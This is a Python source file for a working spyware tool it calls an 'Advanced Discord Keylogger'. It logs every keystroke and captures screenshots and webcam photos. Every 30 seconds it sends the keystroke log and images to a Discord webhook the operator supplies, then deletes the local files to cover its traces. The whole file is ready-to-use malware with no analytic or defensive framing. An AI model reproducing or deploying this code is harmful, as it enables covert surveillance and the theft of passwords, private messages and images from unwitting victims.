from pynput import keyboard
import pyautogui
import requests
import cv2
import time
import shutil
import os


WEBHOOK_URL = "" # insert your discord webhook url here
save_dir = "outputs_ds_webhook"
os.makedirs(save_dir, exist_ok=True)
KEY_LOG_FILE = os.path.join(save_dir, "key_log.txt")




#main keystroke function logger


def on_press(key):
    special_keys = {
        keyboard.Key.space: " ",
        keyboard.Key.enter: " [ENTER]\n",
        keyboard.Key.backspace: " [BACKSPACE] ",
        keyboard.Key.tab: " [TAB] ",
        keyboard.Key.shift: " [SHIFT] ",
        keyboard.Key.shift_l: " [SHIFT] ",
        keyboard.Key.shift_r: " [SHIFT ]",
        keyboard.Key.ctrl_l: " [CTRL] ",
        keyboard.Key.ctrl_r: " [CTRL] ",
        keyboard.Key.alt_l: " [ALT] ",
        keyboard.Key.alt_r: " [ALT] ",
        keyboard.Key.esc: " [ESC] "
    }


    try:
        k = key.char
    except AttributeError:
        k = special_keys.get(key, f"[{key}]")


    with open(KEY_LOG_FILE, "a") as f:
        f.write(k)


	
listener = keyboard.Listener(on_press=on_press)
listener.start()


#screenshot function
def take_screenshot():
    filename = os.path.join(save_dir, "screenshot.png")
    pyautogui.screenshot().save(filename)
    return filename


#webcam capture function
def take_camera_photo():
    filename = os.path.join(save_dir, "camera.png")


    cap = cv2.VideoCapture(0)


    # Check if the camera is available
    if not cap.isOpened():
        print("No camera found, skipping photo.")
        return None


    time.sleep(2)  # Allow the camera to warm up


    ret, frame = cap.read()


    if ret:
        cv2.imwrite(filename, frame)
        cap.release()
        return filename
    else:
        print("Unable to capture image.")
        cap.release()
        return None


#send media to discord webhook function
def send_to_discord():
    #read keylogs
    keylog_data = ""
    if os.path.exists(KEY_LOG_FILE):
        with open(KEY_LOG_FILE, "r") as f:
            keylog_data = f.read()
        open(KEY_LOG_FILE, "w").close()  # Clear the key log after reading


    #capture media
    screenshot = take_screenshot()
    camera = take_camera_photo()
    media_files = [screenshot, camera]


    #send to keylogs
    requests.post(WEBHOOK_URL, data={"content": f"# keylogs:\n---{keylog_data}---"})


    #send images
    for f in media_files:
        if f is None:
            continue


        with open(f, "rb") as file_obj:
            requests.post(WEBHOOK_URL, files={"file": file_obj})


    #cleanup
    for f in os.listdir(save_dir):
        file_path = os.path.join(save_dir, f)
        try:
            if os.path.isfile(file_path):
                os.remove(file_path)
        except Exception as e:
            print(f"Error deleting file {file_path}: {e}")


print("[*] Advanced Discord Keylogger is running successfully.")


while True:
    time.sleep(30) #edit this value to change the time interval in seconds for sending data to discord webhook
    send_to_discord()
